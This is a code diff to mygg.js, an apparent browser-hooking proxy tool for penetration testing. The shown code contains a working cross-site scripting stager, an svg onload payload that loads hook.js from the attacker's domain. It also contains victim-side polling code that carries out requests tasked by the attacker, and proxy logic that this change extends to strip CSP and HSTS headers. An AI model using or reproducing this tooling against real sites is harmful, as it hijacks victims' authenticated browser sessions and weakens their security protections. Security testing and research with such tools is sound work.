@@ -1,6 +1,6 @@
 /* --------- Info --------- */
 
-//  mygg.js v0.3 
+//  mygg.js v0.3.1 
 //  Author: Daniel Solstad
 //  Repository: https://github.com/dsolstad/mygg.js
 
@@ -115,9 +115,10 @@ proxy.createServer(function (req, res) {
         /* Handles the response from the task given to the hooked browser. */
         task_callbacks[new_task.id] = function (result) {
             var headers = result.headers;
-            var headers = str2json(headers);
-            var headers = stripHeaders(headers);
-            
+	    if (headers) {
+                var headers = str2json(headers);
+                var headers = stripHeaders(headers);
+	    }
             var content_type = headers['content-type'];
             
             /* If the received content type is binary, we need to present it as such.
@@ -170,8 +171,7 @@ http_handler = function(req, res) {
         if (tasks_pending.length > 0) {
             data = JSON.stringify(tasks_pending);
             if (config.debug) { 
-                console.log("[+] Tasks pending"); 
-                console.log(data); 
+                console.log("[+] Tasks pending"); console.log(data); 
                 console.log("[+] -------------------------------- [+]");
             }
             res.writeHead(200);
@@ -227,10 +227,10 @@ http.createServer(http_handler).listen(config.http_port, config.http_interface, 
 });
 
 /* Generate key and self-signed certificate. */
-const openssl = spawn('openssl', 'req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=localhost'.split(" "));
+const shell = spawn('openssl', 'req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=localhost'.split(" "));
 
 /* Read key and cert before starting HTTPS Server. */
-openssl.on('close', function (code) {
+shell.on('close', function (code) {
     https_options = { key: fs.readFileSync(config.key), cert: fs.readFileSync(config.cert) };
     https.createServer(https_options, http_handler).listen(config.https_port, config.https_interface, function(err) {
         if (err) return console.error(err)
@@ -242,9 +242,10 @@ openssl.on('close', function (code) {
 
 /* --------- Helper functions --------- */
 
-/* Removes unwanted headers, such as HSTS. */
+/* Removes unwanted headers, such as HSTS and CSP. */
 function stripHeaders(headers) {
     delete headers['strict-transport-security'];
+    delete headers['content-security-policy'];
     delete headers['content-encoding'];
     delete headers['content-length'];
     return headers;
@@ -284,7 +285,7 @@ function str2json(headers) {
 
 var hook = `<svg/onload="var x=document.createElement('script');\
 x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`
-console.log("[+] Payload:\r\n" + hook + "\r\n");
+console.log("[+] Payload stager:\r\n" + hook + "\r\n");
 
 
 /* --------- The mygg.js payload --------- */
@@ -323,7 +324,9 @@ function makeRequest(id, method, url, head, body) {
     target_http.open(method, url, true);
     //for (var key in head) { target_http.setRequestHeader(key, head[key]) }
     if (body) {
-        target_http.send(body);
+        // Need to add some headers sent from the attacking browser
+        target_http.setRequestHeader('content-type', head['content-type']);
+        target_http.send(body.trim());
     } else {
         target_http.send();
     }
@@ -341,7 +344,7 @@ function poll() {
         if (mygg_http.readyState == 4 && mygg_http.status == 200) {
             var tasks = JSON.parse(mygg_http.responseText);
             for (var i in tasks){
-                console.log("New task");console.log(tasks[i]);
+                console.log("New task"); console.log(tasks[i]);
                 makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
             }
         }
